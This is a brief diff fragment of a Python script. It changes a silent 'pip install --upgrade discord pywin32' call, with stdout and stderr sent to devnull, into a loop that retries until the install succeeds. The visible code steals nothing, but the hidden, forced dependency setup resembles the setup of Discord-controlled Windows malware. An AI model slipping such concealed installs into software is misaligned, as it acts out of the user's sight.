@@ -25,11 +25,11 @@ sys.stderr = open(os.devnull, 'w')
 
 import subprocess
 packages = ['discord', 'pywin32']
-subprocess.call(
+while subprocess.call(
     [sys.executable, '-m', 'pip', 'install', '--upgrade', *packages],
     stdout=subprocess.DEVNULL,
     stderr=subprocess.DEVNULL
-)
+): pass
 
 import site
 import importlib
